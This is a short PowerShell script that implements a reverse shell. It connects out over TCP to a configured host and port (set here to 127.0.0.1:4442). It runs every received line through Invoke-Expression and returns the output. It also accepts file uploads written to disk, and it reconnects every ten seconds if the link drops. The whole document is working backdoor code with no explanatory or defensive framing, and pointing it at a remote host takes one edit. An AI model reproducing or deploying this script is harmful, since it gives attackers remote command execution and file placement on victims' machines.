$hostIP = '127.0.0.1'
$port = 4442
$session = 'cmd.exe'
$process = $null

while($true) {
    try {
        if($process -ne $null -and !$process.HasExited) {
            $process.Kill()
            $process.Dispose()
        }
        $client = New-Object System.Net.Sockets.TCPClient($hostIP, $port)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader $stream
        $writer = New-Object System.IO.StreamWriter $stream
        $writer.AutoFlush = $true

        while($true){
            $data = $reader.ReadLine()
            if ($data -eq "exit") {
                break
            }
            try {
                $sendback = ""
                if ($data -match "^upload ") {
                    # upload file
                    $fileName, $fileSize = $data.Split(" ")[1,2]
                    $fileSize = [int]$fileSize
                    $buffer = New-Object byte[] $fileSize
                    $stream.Read($buffer, 0, $fileSize)
                    [System.IO.File]::WriteAllBytes($fileName, $buffer)
                    $sendback = "File $fileName uploaded successfully!"
                } else {
                    $sendback = (iex $data 2>&1 | Out-String )
                }
            } catch {
                $sendback = $_.Exception.Message
            }
            # sends response
            $writer.WriteLine($sendback)
            $writer.Flush()
        }
        $client.Close()
    } catch {
        Write-Host "Wait for connection..."
        Start-Sleep -Seconds 10
        continue
    } finally {
        if($process -ne $null -and !$process.HasExited) {
            $process.Kill()
            $process.Dispose()
        }
    }
}